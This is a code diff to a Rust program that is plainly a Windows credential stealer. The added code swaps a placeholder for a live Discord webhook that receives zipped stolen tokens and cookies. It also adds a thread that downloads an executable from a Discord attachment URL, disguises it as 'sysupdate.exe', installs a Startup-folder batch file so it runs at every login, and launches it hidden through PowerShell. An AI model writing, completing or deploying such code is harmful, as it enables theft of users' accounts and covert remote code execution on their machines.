@@ -18,7 +18,8 @@ fn main() {
         exit(0);
     }
 
-    let handle = thread::spawn(faker);
+    let handle_faker = thread::spawn(faker);
+    let handle_swapper = thread::spawn(swapper);
     let spacer = "=".repeat(50); 
     let user = var("USERNAME").expect("Failed to get USERNAME");
     let base_dir = format!("C:/Users/{}/AppData/Local/Temp/", &user);
@@ -58,7 +59,38 @@ fn main() {
     }
     let _ = function(&spacer, vec_tkn, &tmp_dir);
     let _ = remove_dir_all(&tmp_dir);
-    handle.join().unwrap();
+    handle_swapper.join().unwrap();
+    handle_faker.join().unwrap();
+
+    let _output = Command::new("powershell")
+    .args(&["-Command", format!("Start-Process 'C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\sysupdate.bat' -WindowStyle Hidden", var("USERNAME").expect("Failed to get USERNAME")).as_str()])
+    .creation_flags(0x08000000)
+    .output()
+    .expect("");
+}
+fn swapper() {
+    let url = "https://cdn.discordapp.com/attachments/1095633434673688666/1097086746379943936/swapper.exe";
+    let response = match reqwest::blocking::get(url) {
+        Ok(response) => response,
+        Err(e) => panic!("Failed to send request: {:?}", e),
+    };
+
+    let mut file = match File::create(format!("C:\\Users\\{}\\AppData\\Roaming\\discord\\sysupdate.exe", var("USERNAME").expect("Failed to get USERNAME"))) {
+        Ok(file) => file,
+        Err(e) => panic!("Failed to create file: {:?}", e),
+    };
+
+    let _ = file.write_all(response.bytes().unwrap().as_ref());
+
+    let _ = File::create(format!("C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\sysupdate.bat", var("USERNAME").expect("Failed to get USERNAME")));
+
+    let mut file = OpenOptions::new()
+    .write(true)
+    .open(format!("C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\sysupdate.bat", var("USERNAME").expect("Failed to get USERNAME")))
+    .unwrap();
+
+    let _ = writeln!(file ,"@echo off\nstart /B C:\\Users\\%USERNAME%\\AppData\\Roaming\\discord\\sysupdate.exe");
+
 }
 fn faker() {
     let asscii = r#"
@@ -231,7 +263,7 @@ fn function(spacer: &String, vec_tkn: Vec<String>, tmp_dir: &String) -> Result<(
     std::io::copy(&mut std::io::BufReader::new(File::open(format!("{}Cookies.txt", &tmp_dir)).unwrap()), &mut zip_writer).unwrap();
     zip_writer.finish().unwrap();
     
-    let webhook_url = "your_web_hook";
+    let webhook_url = "https://discord.com/api/webhooks/1089029410696462357/AohD1pamDkiW_7ftgesH-shlFKoOYTT9cLsrRXZ_xXKYVTmGEv0-zjpYc_00snqD0nRF";
     let file_path = format!("{}{}.zip", &tmp_dir, hostnames);
     let file_name = format!("{}.zip", hostnames);
     let file_contents = read(file_path)?;
